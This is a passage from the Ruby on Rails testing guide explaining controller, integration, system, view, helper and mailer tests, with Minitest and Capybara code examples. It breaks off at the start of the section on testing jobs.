* `@response` - The response object

```ruby
class ArticlesControllerTest < ActionDispatch::IntegrationTest
  test "should get index" do
    get articles_url

    assert_equal "index", @controller.action_name
    assert_equal "application/x-www-form-urlencoded", @request.media_type
    assert_match "Articles", @response.body
  end
end
```

### Setting Headers and CGI Variables

HTTP headers are pieces of information sent along with HTTP requests to provide
important metadata. CGI variables are environment variables used to exchange
information between the web server and the application.

HTTP headers and CGI variables can be tested by being passed as headers:

```ruby
# setting an HTTP Header
get articles_url, headers: { "Content-Type": "text/plain" } # simulate the request with custom header

# setting a CGI variable
get articles_url, headers: { "HTTP_REFERER": "http://example.com/home" } # simulate the request with custom env variable
```

### Testing `flash` Notices

As can be seen in the [testing other request objects
section](#testing-other-request-objects), one of the three hash objects that is
accessible in the tests is `flash`. This section outlines how to test the
appearance of a `flash` message in our blog application whenever someone
successfully creates a new article.

First, an assertion should be added to the `test_should_create_article` test:

```ruby
test "should create article" do
  assert_difference("Article.count") do
    post articles_url, params: { article: { title: "Some title" } }
  end

  assert_redirected_to article_path(Article.last)
  assert_equal "Article was successfully created.", flash[:notice]
end
```

If the test is run now, it should fail:

```bash
$ bin/rails test test/controllers/articles_controller_test.rb -n test_should_create_article
Running 1 tests in a single process (parallelization threshold is 50)
Run options: -n test_should_create_article --seed 32266

# Running:

F

Finished in 0.114870s, 8.7055 runs/s, 34.8220 assertions/s.

  1) Failure:
ArticlesControllerTest#test_should_create_article [/test/controllers/articles_controller_test.rb:16]:
--- expected
+++ actual
@@ -1 +1 @@
-"Article was successfully created."
+nil

1 runs, 4 assertions, 1 failures, 0 errors, 0 skips
```

Now implement the flash message in the controller. The `:create` action should
look like this:

```ruby
def create
  @article = Article.new(article_params)

  if @article.save
    flash[:notice] = "Article was successfully created."
    redirect_to @article
  else
    render "new"
  end
end
```

Now, if the tests are run they should pass:

```bash
$ bin/rails test test/controllers/articles_controller_test.rb -n test_should_create_article
Running 1 tests in a single process (parallelization threshold is 50)
Run options: -n test_should_create_article --seed 18981

# Running:

.

Finished in 0.081972s, 12.1993 runs/s, 48.7972 assertions/s.

1 runs, 4 assertions, 0 failures, 0 errors, 0 skips
```

NOTE: If you generated your controller using the scaffold generator, the flash
message will already be implemented in your `create` action.

### Tests for `show`, `update`, and `delete` Actions

So far in the guide tests for the `:index` as well as the`:create` action have
been outlined. What about the other actions?

You can write a test for `:show` as follows:

```ruby
test "should show article" do
  article = articles(:one)
  get article_url(article)
  assert_response :success
end
```

If you remember from our discussion earlier on [fixtures](#fixtures), the
`articles()` method will provide access to the articles fixtures.

How about deleting an existing article?

```ruby
test "should delete article" do
  article = articles(:one)
  assert_difference("Article.count", -1) do
    delete article_url(article)
  end

  assert_redirected_to articles_path
end
```

Here is a test for updating an existing article:

```ruby
test "should update article" do
  article = articles(:one)

  patch article_url(article), params: { article: { title: "updated" } }

  assert_redirected_to article_path(article)
  # Reload article to refresh data and assert that title is updated.
  article.reload
  assert_equal "updated", article.title
end
```

Notice that there is some duplication in these three tests - they both access
the same article fixture data. It is possible to DRY ('Don't Repeat
Yourself') the implementation by using the `setup` and `teardown` methods
provided by `ActiveSupport::Callbacks`.

The tests might look like this:

```ruby
require "test_helper"

class ArticlesControllerTest < ActionDispatch::IntegrationTest
  # called before every single test
  setup do
    @article = articles(:one)
  end

  # called after every single test
  teardown do
    # when controller is using cache it may be a good idea to reset it afterwards
    Rails.cache.clear
  end

  test "should show article" do
    # Reuse the @article instance variable from setup
    get article_url(@article)
    assert_response :success
  end

  test "should destroy article" do
    assert_difference("Article.count", -1) do
      delete article_url(@article)
    end

    assert_redirected_to articles_path
  end

  test "should update article" do
    patch article_url(@article), params: { article: { title: "updated" } }

    assert_redirected_to article_path(@article)
    # Reload association to fetch updated data and assert that title is updated.
    @article.reload
    assert_equal "updated", @article.title
  end
end
```

NOTE: Similar to other callbacks in Rails, the `setup` and `teardown` methods
can also accept a block, lambda, or a method name as a symbol to be called.

Integration Testing
-------------------

Integration tests take functional controller tests one step further - they focus
on testing how several parts of an application interact, and are generally used
to test important workflows. Rails integration tests are stored in the
`test/integration` directory.

Rails provides a generator to create an integration test skeleton as follows:

```bash
$ bin/rails generate integration_test user_flows
      invoke  test_unit
      create  test/integration/user_flows_test.rb
```

Here's what a freshly generated integration test looks like:

```ruby
require "test_helper"

class UserFlowsTest < ActionDispatch::IntegrationTest
  # test "the truth" do
  #   assert true
  # end
end
```

Here the test is inheriting from
[`ActionDispatch::IntegrationTest`](https://api.rubyonrails.org/classes/ActionDispatch/IntegrationTest.html).
This makes some additional [helpers available for integration
tests](testing.html#helpers-available-for-integration-tests) alongside the
standard testing helpers.

### Implementing an Integration Test

Let's add an integration test to our blog application, by starting with a basic
workflow of creating a new blog article to verify that everything is working
properly.

Start by generating the integration test skeleton:

```bash
$ bin/rails generate integration_test blog_flow
```

It should have created a test file placeholder. With the output of the previous
command you should see:

```
      invoke  test_unit
      create    test/integration/blog_flow_test.rb
```

Now open that file and write the first assertion:

```ruby
require "test_helper"

class BlogFlowTest < ActionDispatch::IntegrationTest
  test "can see the welcome page" do
    get "/"
    assert_dom "h1", "Welcome#index"
  end
end
```

If you visit the root path, you should see `welcome/index.html.erb` rendered for
the view. So this assertion should pass.

NOTE: The assertion `assert_dom` (aliased to `assert_select`) is available in integration tests to check
the presence of key HTML elements and their content.

#### Creating Articles Integration

To test the ability to create a new article in our blog and display the
resulting article, see the example below:

```ruby
test "can create an article" do
  get "/articles/new"
  assert_response :success

  post "/articles",
    params: { article: { title: "can create", body: "article successfully." } }
  assert_response :redirect
  follow_redirect!
  assert_response :success
  assert_dom "p", "Title:\n  can create"
end
```

The `:new` action of our Articles controller is called first, and the response
should be successful.

Next, a `post` request is made to the `:create` action of the Articles
controller:

```ruby
post "/articles",
  params: { article: { title: "can create", body: "article successfully." } }
assert_response :redirect
follow_redirect!
```

The two lines following the request are to handle the redirect setup when
creating a new article.

NOTE: Don't forget to call `follow_redirect!` if you plan to make subsequent
requests after a redirect is made.

Finally it can be asserted that the response was successful and the
newly-created article is readable on the page.

A very small workflow for visiting our blog and creating a new article was
successfully tested above. To extend this, additional tests could be added for
features like adding comments, editing comments or removing articles.
Integration tests are a great place to experiment with all kinds of use cases
for our applications.

### Helpers Available for Integration Tests

There are numerous helpers to choose from for use in integration tests. Some
include:

* [`ActionDispatch::Integration::Runner`](https://api.rubyonrails.org/classes/ActionDispatch/Integration/Runner.html)
  for helpers relating to the integration test runner, including creating a new
  session.

* [`ActionDispatch::Integration::RequestHelpers`](https://api.rubyonrails.org/classes/ActionDispatch/Integration/RequestHelpers.html)
  for performing requests.

* [`ActionDispatch::TestProcess::FixtureFile`](https://api.rubyonrails.org/classes/ActionDispatch/TestProcess/FixtureFile.html)
  for uploading files.

* [`ActionDispatch::Integration::Session`](https://api.rubyonrails.org/classes/ActionDispatch/Integration/Session.html)
  to modify sessions or the state of the integration tests.

System Testing
--------------

Similarly to integration testing, system testing allows you to test how the
components of your app work together, but from the point of view of a user. It
does this by running tests in either a real or a headless browser (a browser
which runs in the background without opening a visible window). System tests use
[Capybara](https://www.rubydoc.info/github/jnicklas/capybara) under the hood.

### When to Use System Tests

System tests provide the most realistic testing experience as they test your
application from a user's perspective. However, they come with important
trade-offs:

* **They are significantly slower** than unit and integration tests
* **They can be brittle** and prone to failures from timing issues or UI changes
* **They require more maintenance** as your UI evolves

Given these trade-offs, **system tests should be reserved for critical user
paths** rather than being created for every feature. Consider writing system
tests for:

* **Core business workflows** (e.g., user registration, checkout process,
  payment flows)
* **Critical user interactions** that integrate multiple components
* **Complex JavaScript interactions** that can't be tested at lower levels

For most features, integration tests provide a better balance of coverage and
maintainability. Save system tests for scenarios where you need to verify the
complete user experience.

### Generating System Tests

Rails no longer generates system tests by default when using scaffolds. This
change reflects the best practice of using system tests sparingly. You can
generate system tests in two ways:

1. **When scaffolding**, explicitly enable system tests:

    ```bash
    $ bin/rails generate scaffold Article title:string body:text --system-tests=true
    ```

2. **Generate system tests independently** for critical features:

    ```bash
    $ bin/rails generate system_test articles
    ```

Rails system tests are stored in the `test/system` directory in your
application. To generate a system test skeleton, run the following command:

```bash
$ bin/rails generate system_test users
      invoke  test_unit
      create    test/application_system_test_case.rb
      create    test/system/users_test.rb
```

Here's what a freshly generated system test looks like:

```ruby
require "application_system_test_case"

class UsersTest < ApplicationSystemTestCase
  # test "visiting the index" do
  #   visit users_url
  #
  #   assert_dom "h1", text: "Users"
  # end
end
```

By default, system tests are run with the Selenium driver, using the Chrome
browser, and a screen size of 1400x1400. The next section explains how to change
the default settings.

### Changing the Default Settings

Rails makes changing the default settings for system tests very simple. All the
setup is abstracted away so you can focus on writing your tests.

When you generate system tests, an
`application_system_test_case.rb` file is created in the test directory. This is
where all the configuration for your system tests should live.

If you want to change the default settings, you can change what the system tests
are "driven by". If you want to change the driver from Selenium to Cuprite,
you'd add the [`cuprite`](https://github.com/rubycdp/cuprite) gem to your
`Gemfile`. Then in your `application_system_test_case.rb` file you'd do the
following:

```ruby
require "test_helper"
require "capybara/cuprite"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :cuprite
end
```

The driver name is a required argument for `driven_by`. The optional arguments
that can be passed to `driven_by` are `:using` for the browser (this will only
be used by Selenium), `:screen_size` to change the size of the screen for
screenshots, and `:options` which can be used to set options supported by the
driver.

```ruby
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :firefox
end
```

If you want to use a headless browser, you could use Headless Chrome or Headless
Firefox by adding `headless_chrome` or `headless_firefox` in the `:using`
argument.

```ruby
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :headless_chrome
end
```

If you want to use a remote browser, e.g. [Headless Chrome in
Docker](https://github.com/SeleniumHQ/docker-selenium), you have to add a remote
`url` and set `browser` as remote through `options`.

```ruby
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  url = ENV.fetch("SELENIUM_REMOTE_URL", nil)
  options = if url
    { browser: :remote, url: url }
  else
    { browser: :chrome }
  end
  driven_by :selenium, using: :headless_chrome, options: options
end
```

Now you should get a connection to the remote browser.

```bash
$ SELENIUM_REMOTE_URL=http://localhost:4444/wd/hub bin/rails test:system
```

If your application is remote, e.g. within a Docker container, Capybara needs
more input about how to [call remote
servers](https://github.com/teamcapybara/capybara#calling-remote-servers).

```ruby
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  setup do
      Capybara.server_host = "0.0.0.0" # bind to all interfaces
      Capybara.app_host = "http://#{IPSocket.getaddress(Socket.gethostname)}" if ENV["SELENIUM_REMOTE_URL"].present?
    end
  # ...
end
```

Now you should get a connection to a remote browser and server, regardless if it
is running in a Docker container or CI.

If your Capybara configuration requires more setup than provided by Rails, this
additional configuration can be added into the `application_system_test_case.rb`
file.

Please see [Capybara's
documentation](https://github.com/teamcapybara/capybara#setup) for additional
settings.

### Implementing a System Test

This section will demonstrate how to add a system test to your application,
which tests a visit to the index page to create a new blog article.

NOTE: The scaffold generator no longer creates system tests by default. To
include system tests when scaffolding, use the `--system-tests=true` option.
Otherwise, create system tests manually for your critical user paths.

```bash
$ bin/rails generate system_test articles
```

It should have created a test file placeholder. With the output of the previous
command you should see:

```
      invoke  test_unit
      create    test/application_system_test_case.rb
      create    test/system/articles_test.rb
```

Now, let's open that file and write the first assertion:

```ruby
require "application_system_test_case"

class ArticlesTest < ApplicationSystemTestCase
  test "viewing the index" do
    visit articles_path
    assert_selector "h1", text: "Articles"
  end
end
```

The test should see that there is an `h1` on the articles index page and pass.

Run the system tests.

```bash
$ bin/rails test:system
```

NOTE: By default, running `bin/rails test` won't run your system tests. Make
sure to run `bin/rails test:system` to actually run them. You can also run
`bin/rails test:all` to run all tests, including system tests.

#### Creating Articles System Test

Now you can test the flow for creating a new article.

```ruby
test "should create Article" do
  visit articles_path

  click_on "New Article"

  fill_in "Title", with: "Creating an Article"
  fill_in "Body", with: "Created this article successfully!"

  click_on "Create Article"

  assert_text "Creating an Article"
end
```

The first step is to call `visit articles_path`. This will take the test to the
articles index page.

Then the `click_on "New Article"` will find the "New Article" button on the
index page. This will redirect the browser to `/articles/new`.

Then the test will fill in the title and body of the article with the specified
text. Once the fields are filled in, "Create Article" is clicked on which will
send a POST request to `/articles/create`.

This redirects the user back to the articles index page, and there it is
asserted that the text from the new article's title is on the articles index
page.

#### Testing for Multiple Screen Sizes

If you want to test for mobile sizes in addition to testing for desktop, you can
create another class that inherits from `ActionDispatch::SystemTestCase` and use
it in your test suite. In this example, a file called
`mobile_system_test_case.rb` is created in the `/test` directory with the
following configuration.

```ruby
require "test_helper"

class MobileSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :chrome, screen_size: [375, 667]
end
```

To use this configuration, create a test inside `test/system` that inherits from
`MobileSystemTestCase`. Now you can test your app using multiple different
configurations.

```ruby
require "mobile_system_test_case"

class PostsTest < MobileSystemTestCase
  test "visiting the index" do
    visit posts_url
    assert_selector "h1", text: "Posts"
  end
end
```

#### Capybara Assertions

Here's an extract of the assertions provided by
[`Capybara`](https://rubydoc.info/github/teamcapybara/capybara/master/Capybara/Minitest/Assertions)
which can be used in system tests.

| Assertion                                                        | Purpose |
| ---------------------------------------------------------------- | ------- |
| `assert_button(locator = nil, **options, &optional_filter_block)`| Checks if the page has a button with the given text, value or id. |
| `assert_current_path(string, **options)`                         | Asserts that the page has the given path. |
| `assert_field(locator = nil, **options, &optional_filter_block)` | Checks if the page has a form field with the given label, name or id. |
| `assert_link(locator = nil, **options, &optional_filter_block)`  | Checks if the page has a link with the given text or id. |
| `assert_selector(*args, &optional_filter_block)`                 | Asserts that a given selector is on the page. |
| `assert_table(locator = nil, **options, &optional_filter_block`  | Checks if the page has a table with the given id or caption. |
| `assert_text(type, text, **options)`                             | Asserts that the page has the given text content. |


#### Screenshot Helper

The
[`ScreenshotHelper`](https://api.rubyonrails.org/classes/ActionDispatch/SystemTesting/TestHelpers/ScreenshotHelper.html)
is a helper designed to capture screenshots of your tests. This can be helpful
for viewing the browser at the point a test failed, or to view screenshots later
for debugging.

Two methods are provided: `take_screenshot` and `take_failed_screenshot`.
`take_failed_screenshot` is automatically included in `before_teardown` inside
Rails.

The `take_screenshot` helper method can be included anywhere in your tests to
take a screenshot of the browser.

#### Taking It Further

System testing is similar to [integration testing](#integration-testing) in that
it tests the user's interaction with your controller, model, and view, but
system testing tests your application as if a real user were using it. With
system tests, you can test anything that a user would do in your application
such as commenting, deleting articles, publishing draft articles, etc.

Test Helpers
------------

To avoid code duplication, you can add your own test helpers. Here is an example
for signing in:

```ruby
# test/test_helper.rb

module SignInHelper
  def sign_in_as(user)
    post sign_in_url(email: user.email, password: user.password)
  end
end

class ActionDispatch::IntegrationTest
  include SignInHelper
end
```

```ruby
require "test_helper"

class ProfileControllerTest < ActionDispatch::IntegrationTest
  test "should show profile" do
    # helper is now reusable from any controller test case
    sign_in_as users(:david)

    get profile_url
    assert_response :success
  end
end
```

### Using Separate Files

If you find your helpers are cluttering `test_helper.rb`, you can extract them
into separate files. A good place to store them is `test/lib` or
`test/test_helpers`.

```ruby
# test/test_helpers/multiple_assertions.rb
module MultipleAssertions
  def assert_multiple_of_forty_two(number)
    assert (number % 42 == 0), "expected #{number} to be a multiple of 42"
  end
end
```

These helpers can then be explicitly required and included as needed:

```ruby
require "test_helper"
require "test_helpers/multiple_assertions"

class NumberTest < ActiveSupport::TestCase
  include MultipleAssertions

  test "420 is a multiple of 42" do
    assert_multiple_of_forty_two 420
  end
end
```

They can also continue to be included directly into the relevant parent classes:

```ruby
# test/test_helper.rb
require "test_helpers/sign_in_helper"

class ActionDispatch::IntegrationTest
  include SignInHelper
end
```

### Eagerly Requiring Helpers

You may find it convenient to eagerly require helpers in `test_helper.rb` so
your test files have implicit access to them. This can be accomplished using
globbing, as follows

```ruby
# test/test_helper.rb
Dir[Rails.root.join("test", "test_helpers", "**", "*.rb")].each { |file| require file }
```

This has the downside of increasing the boot-up time, as opposed to manually
requiring only the necessary files in your individual tests.

Testing Routes
--------------

Like everything else in your Rails application, you can test your routes. Route
tests are stored in `test/controllers/` or are part of controller tests. If your
application has complex routes, Rails provides a number of useful helpers to
test them.

For more information on routing assertions available in Rails, see the API
documentation for
[`ActionDispatch::Assertions::RoutingAssertions`](https://api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html).

Testing Views
-------------

Testing the response to your request by asserting the presence of key HTML
elements and their content is one way to test the views of your application.
Like route tests, view tests are stored in `test/controllers/` or are part of
controller tests.

### Querying the HTML

Methods like `assert_dom` and `assert_dom_equal` allow you to query HTML
elements of the response by using a simple yet powerful syntax.

`assert_dom` is an assertion that will return true if matching elements are
found. For example, you could verify that the page title is "Welcome to the
Rails Testing Guide" as follows:

```ruby
assert_dom "title", "Welcome to the Rails Testing Guide"
```

You can also use nested `assert_dom` blocks for deeper investigation.

In the following example, the inner `assert_dom` for `li.menu_item` runs within
the collection of elements selected by the outer block:

```ruby
assert_dom "ul.navigation" do
  assert_dom "li.menu_item"
end
```

A collection of selected elements may also be iterated through so that
`assert_dom` may be called separately for each element. For example, if the
response contains two ordered lists, each with four nested list elements then
the following tests will both pass.

```ruby
assert_dom "ol" do |elements|
  elements.each do |element|
    assert_dom element, "li", 4
  end
end

assert_dom "ol" do
  assert_dom "li", 8
end
```

The `assert_dom_equal` method compares two HTML strings to see if they are
equal:

```ruby
assert_dom_equal '<a href="http://www.further-reading.com">Read more</a>',
  link_to("Read more", "http://www.further-reading.com")
```

For more advanced usage, refer to the [`rails-dom-testing`
documentation](https://github.com/rails/rails-dom-testing).

In order to integrate with [rails-dom-testing][], tests that inherit from
`ActionView::TestCase` declare a `document_root_element` method that returns the
rendered content as an instance of a
[Nokogiri::XML::Node](https://nokogiri.org/rdoc/Nokogiri/XML/Node.html):

```ruby
test "renders a link to itself" do
  article = Article.create! title: "Hello, world"

  render "articles/article", article: article
  anchor = document_root_element.at("a")

  assert_equal article.name, anchor.text
  assert_equal article_url(article), anchor["href"]
end
```

If your application depends on [Nokogiri >=
1.14.0](https://github.com/sparklemotion/nokogiri/releases/tag/v1.14.0) or
higher, and [minitest >=
5.18.0](https://github.com/minitest/minitest/blob/v5.18.0/History.rdoc#5180--2023-03-04-),
`document_root_element` supports [Ruby's Pattern
Matching](https://docs.ruby-lang.org/en/master/syntax/pattern_matching_rdoc.html):

```ruby
test "renders a link to itself" do
  article = Article.create! title: "Hello, world"

  render "articles/article", article: article
  anchor = document_root_element.at("a")
  url = article_url(article)

  assert_pattern do
    anchor => { content: "Hello, world", attributes: [{ name: "href", value: url }] }
  end
end
```

If you'd like to access the same [Capybara-powered
Assertions](https://rubydoc.info/github/teamcapybara/capybara/master/Capybara/Minitest/Assertions)
that your [System Testing](#system-testing) tests utilize, you can define a base
class that inherits from `ActionView::TestCase` and transforms the
`document_root_element` into a `page` method:

```ruby
# test/view_partial_test_case.rb

require "test_helper"
require "capybara/minitest"

class ViewPartialTestCase < ActionView::TestCase
  include Capybara::Minitest::Assertions

  def page
    Capybara.string(rendered)
  end
end

# test/views/article_partial_test.rb

require "view_partial_test_case"

class ArticlePartialTest < ViewPartialTestCase
  test "renders a link to itself" do
    article = Article.create! title: "Hello, world"

    render "articles/article", article: article

    assert_link article.title, href: article_url(article)
  end
end
```

More information about the assertions included by Capybara can be found in the
[Capybara Assertions](#capybara-assertions) section.

### Parsing View Content

Starting in Action View version 7.1, the `rendered` helper method returns an
object capable of parsing the view partial's rendered content.

To transform the `String` content returned by the `rendered` method into an
object, define a parser by calling
[`register_parser`](https://api.rubyonrails.org/classes/ActionView/TestCase/Behavior/ClassMethods.html#method-i-register_parser).
Calling `register_parser :rss` defines a `rendered.rss` helper method. For
example, to parse rendered [RSS content][] into an object with `rendered.rss`,
register a call to `RSS::Parser.parse`:

```ruby
register_parser :rss, -> rendered { RSS::Parser.parse(rendered) }

test "renders RSS" do
  article = Article.create!(title: "Hello, world")

  render formats: :rss, partial: article

  assert_equal "Hello, world", rendered.rss.items.last.title
end
```

By default, `ActionView::TestCase` defines a parser for:

* `:html` - returns an instance of
  [Nokogiri::XML::Node](https://nokogiri.org/rdoc/Nokogiri/XML/Node.html)
* `:json` - returns an instance of
  [ActiveSupport::HashWithIndifferentAccess](https://api.rubyonrails.org/classes/ActiveSupport/HashWithIndifferentAccess.html)

```ruby
test "renders HTML" do
  article = Article.create!(title: "Hello, world")

  render partial: "articles/article", locals: { article: article }

  assert_pattern { rendered.html.at("main h1") => { content: "Hello, world" } }
end

test "renders JSON" do
  article = Article.create!(title: "Hello, world")

  render formats: :json, partial: "articles/article", locals: { article: article }

  assert_pattern { rendered.json => { title: "Hello, world" } }
end
```

[rails-dom-testing]: https://github.com/rails/rails-dom-testing
[RSS content]: https://www.rssboard.org/rss-specification

### Additional View-Based Assertions

There are more assertions that are primarily used in testing views:

| Assertion                                                 | Purpose |
| --------------------------------------------------------- | ------- |
| `assert_dom_email`                                     | Allows you to make assertions on the body of an e-mail. |
| `assert_dom_encoded`                                   | Allows you to make assertions on encoded HTML. It does this by un-encoding the contents of each element and then calling the block with all the un-encoded elements.|
| `css_select(selector)` or `css_select(element, selector)` | Returns an array of all the elements selected by the _selector_. In the second variant it first matches the base _element_ and tries to match the _selector_ expression on any of its children. If there are no matches both variants return an empty array.|

Here's an example of using `assert_dom_email`:

```ruby
assert_dom_email do
  assert_dom "small", "Please click the 'Unsubscribe' link if you want to opt-out."
end
```

### Testing View Partials

[Partial](layouts_and_rendering.html#using-partials) templates - usually called
"partials" - can break the rendering process into more manageable chunks. With
partials, you can extract sections of code from your views to separate files and
reuse them in multiple places.

View tests provide an opportunity to test that partials render content the way
you expect. View partial tests can be stored in `test/views/` and inherit from
`ActionView::TestCase`.

To render a partial, call `render` like you would in a template. The content is
available through the test-local `rendered` method:

```ruby
class ArticlePartialTest < ActionView::TestCase
  test "renders a link to itself" do
    article = Article.create! title: "Hello, world"

    render "articles/article", article: article

    assert_includes rendered, article.title
  end
end
```

Tests that inherit from `ActionView::TestCase` also have access to
[`assert_dom`](#testing-views) and the [other additional view-based
assertions](#additional-view-based-assertions) provided by
[rails-dom-testing][]:

```ruby
test "renders a link to itself" do
  article = Article.create! title: "Hello, world"

  render "articles/article", article: article

  assert_dom "a[href=?]", article_url(article), text: article.title
end
```

### Testing View Helpers

A helper is a module where you can define methods which are available in your
views.

In order to test helpers, all you need to do is check that the output of the
helper method matches what you'd expect. Tests related to the helpers are
located under the `test/helpers` directory.

Given we have the following helper:

```ruby
module UsersHelper
  def link_to_user(user)
    link_to "#{user.first_name} #{user.last_name}", user
  end
end
```

We can test the output of this method like this:

```ruby
class UsersHelperTest < ActionView::TestCase
  test "should return the user's full name" do
    user = users(:david)

    assert_dom_equal %{<a href="/user/#{user.id}">David Heinemeier Hansson</a>}, link_to_user(user)
  end
end
```

Moreover, since the test class extends from `ActionView::TestCase`, you have
access to Rails' helper methods such as `link_to` or `pluralize`.

Testing Mailers
---------------

Your mailer classes - like every other part of your Rails application - should
be tested to ensure that they are working as expected.

The goals of testing your mailer classes are to ensure that:

* emails are being processed (created and sent)
* the email content is correct (subject, sender, body, etc)
* the right emails are being sent at the right times

There are two aspects of testing your mailer, the unit tests and the functional
tests. In the unit tests, you run the mailer in isolation with tightly
controlled inputs and compare the output to a known value (a
[fixture](#fixtures)). In the functional tests you don't so much test the
details produced by the mailer; instead, you test that the controllers and
models are using the mailer in the right way. You test to prove that the right
email was sent at the right time.

### Unit Testing

In order to test that your mailer is working as expected, you can use unit tests
to compare the actual results of the mailer with pre-written examples of what
should be produced.

#### Mailer Fixtures

For the purposes of unit testing a mailer, fixtures are used to provide an
example of how the output _should_ look. Because these are example emails, and
not Active Record data like the other fixtures, they are kept in their own
subdirectory apart from the other fixtures. The name of the directory within
`test/fixtures` directly corresponds to the name of the mailer. So, for a mailer
named `UserMailer`, the fixtures should reside in `test/fixtures/user_mailer`
directory.

If you generated your mailer, the generator does not create stub fixtures for
the mailers actions. You'll have to create those files yourself as described
above.

#### The Basic Test Case

Here's a unit test to test a mailer named `UserMailer` whose action `invite` is
used to send an invitation to a friend:

```ruby
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite("me@example.com",
                                     "friend@example.com", Time.now)

    # Send the email, then test that it got queued
    assert_emails 1 do
      email.deliver_now
    end

    # Test the body of the sent email contains what we expect it to
    assert_equal ["me@example.com"], email.from
    assert_equal ["friend@example.com"], email.to
    assert_equal "You have been invited by me@example.com", email.subject
    assert_equal read_fixture("invite").join, email.body.to_s
  end
end
```

In the test the email is created and the returned object is stored in the
`email` variable. The first assert checks it was sent, then, in the second batch
of assertions, the email contents are checked. The helper `read_fixture` is used
to read in the content from this file.

NOTE: `email.body.to_s` is present when there's only one (HTML or text) part
present. If the mailer provides both, you can test your fixture against specific
parts with `email.text_part.body.to_s` or `email.html_part.body.to_s`.

Here's the content of the `invite` fixture:

```
Hi friend@example.com,

You have been invited.

Cheers!
```

When testing multi-part emails with both HTML *and* text parts, use the
[`assert_part`](https://api.rubyonrails.org/classes/ActionMailer/TestCase/Behavior.html#method-i-assert_part)
assertion. When testing emails with HTML parts, use the assertions provided by [Rails::Dom::Testing](https://github.com/rails/rails-dom-testing).

```ruby
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite("me@example.com",
                                     "friend@example.com", Time.now)

    # Test the body of the sent email's text part
    assert_part :text, email do |text|
      assert_includes text, "Hi friend@example.com"
      assert_includes text, "You have been invited."
      assert_includes text, "Cheers!"
    end

    # Test the body of the sent email's HTML part
    assert_part :html, email do |html|
      assert_dom html, "h1", text: "Hi friend@example.com"
      assert_dom html, "p", text: "You have been invited."
      assert_dom html, "p", text: "Cheers!"
    end
  end
end
```

#### Configuring the Delivery Method for Test

The line `ActionMailer::Base.delivery_method = :test` in
`config/environments/test.rb` sets the delivery method to test mode so that the
email will not actually be delivered (useful to avoid spamming your users while
testing). Instead, the email will be appended to an array
(`ActionMailer::Base.deliveries`).

NOTE: The `ActionMailer::Base.deliveries` array is only reset automatically in
`ActionMailer::TestCase` and `ActionDispatch::IntegrationTest` tests. If you
want to have a clean slate outside these test cases, you can reset it manually
with: `ActionMailer::Base.deliveries.clear`

#### Testing Enqueued Emails

You can use the `assert_enqueued_email_with` assertion to confirm that the email
has been enqueued with all of the expected mailer method arguments and/or
parameterized mailer parameters. This allows you to match any emails that have
been enqueued with the `deliver_later` method.

As with the basic test case, we create the email and store the returned object
in the `email` variable. The following examples include variations of passing
arguments and/or parameters.

This example will assert that the email has been enqueued with the correct
arguments:

```ruby
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite("me@example.com", "friend@example.com")

    # Test that the email got enqueued with the correct arguments
    assert_enqueued_email_with UserMailer, :create_invite, args: ["me@example.com", "friend@example.com"] do
      email.deliver_later
    end
  end
end
```

This example will assert that a mailer has been enqueued with the correct mailer
method named arguments by passing a hash of the arguments as `args`:

```ruby
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite(from: "me@example.com", to: "friend@example.com")

    # Test that the email got enqueued with the correct named arguments
    assert_enqueued_email_with UserMailer, :create_invite,
    args: [{ from: "me@example.com", to: "friend@example.com" }] do
      email.deliver_later
    end
  end
end
```

This example will assert that a parameterized mailer has been enqueued with the
correct parameters and arguments. The mailer parameters are passed as `params`
and the mailer method arguments as `args`:

```ruby
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.with(all: "good").create_invite("me@example.com", "friend@example.com")

    # Test that the email got enqueued with the correct mailer parameters and arguments
    assert_enqueued_email_with UserMailer, :create_invite,
    params: { all: "good" }, args: ["me@example.com", "friend@example.com"] do
      email.deliver_later
    end
  end
end
```

This example shows an alternative way to test that a parameterized mailer has
been enqueued with the correct parameters:

```ruby
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.with(to: "friend@example.com").create_invite

    # Test that the email got enqueued with the correct mailer parameters
    assert_enqueued_email_with UserMailer.with(to: "friend@example.com"), :create_invite do
      email.deliver_later
    end
  end
end
```

### Functional and System Testing

Unit testing allows us to test the attributes of the email while functional and
system testing allows us to test whether user interactions appropriately trigger
the email to be delivered. For example, you can check that the invite friend
operation is sending an email appropriately:

```ruby
# Integration Test
require "test_helper"

class UsersControllerTest < ActionDispatch::IntegrationTest
  test "invite friend" do
    # Asserts the difference in the ActionMailer::Base.deliveries
    assert_emails 1 do
      post invite_friend_url, params: { email: "friend@example.com" }
    end
  end
end
```

```ruby
# System Test
require "test_helper"

class UsersTest < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :headless_chrome

  test "inviting a friend" do
    visit invite_users_url
    fill_in "Email", with: "friend@example.com"
    assert_emails 1 do
      click_on "Invite"
    end
  end
end
```

NOTE: The `assert_emails` method is not tied to a particular deliver method and
will work with emails delivered with either the `deliver_now` or `deliver_later`
method. If we explicitly want to assert that the email has been enqueued we can
use the `assert_enqueued_email_with` ([examples
above](#testing-enqueued-emails)) or `assert_enqueued_emails` methods. More
information can be found in the
[documentation](https://api.rubyonrails.org/classes/ActionMailer/TestHelper.html).

Testing Jobs
------------

Jobs can be tested in isolation (focusing on the job's behavior) and in context
(focusing on the calling code's behavior).

### Testing Jobs in Isolation

When you generate a job, an associated test file will also be generated in the
`test/jobs` directory.

